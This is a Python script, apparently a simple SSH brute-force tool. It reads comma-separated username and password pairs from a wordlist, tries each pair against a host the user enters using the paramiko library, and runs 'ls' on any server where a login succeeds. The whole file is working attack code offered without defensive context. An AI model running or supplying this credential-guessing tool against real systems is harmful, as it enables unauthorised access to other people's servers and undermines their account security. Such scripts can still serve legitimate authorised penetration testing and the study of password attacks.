import paramiko

# Let's get the target hostname or IP address from the user
hostname = input("Enter the hostname or IP address: ")

# Open the file in read mode
with open('wordlist.txt', 'r') as file:
    # Read the file line by line
    line = file.readline()

    # Iterate through each line until the end of the file
    while line:
        # Split the line into username and password using comma as a delimiter
        username, password = line.strip().split(', ')

        # Output the username and password

        print('Attempting with the following credentials:')
        print('Username:', username)
        print('Password:', password)

        # Establish an SSH connection
        try:
            # Create an SSH client
            ssh = paramiko.SSHClient()

            # Automatically add the server's host key (this is insecure and should be avoided in production)
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

            # Connect to the server
            ssh.connect(hostname, username=username, password=password)

            # Execute a command (for example, 'ls' command)
            stdin, stdout, stderr = ssh.exec_command('ls')
            
            # Print the output of the command
            print("Output of 'ls' command:")
            print(stdout.read().decode())

            # Close the SSH connection
            ssh.close()

        except paramiko.AuthenticationException:
            print("Authentication failed, please verify your credentials.")
        except paramiko.SSHException as ssh_exception:
            print(f"Unable to establish SSH connection: {ssh_exception}")
        except Exception as e:
            print(f"An error occurred: {e}")

        # Read the next line
        line = file.readline()

# File is automatically closed when the block inside 'with' is exited
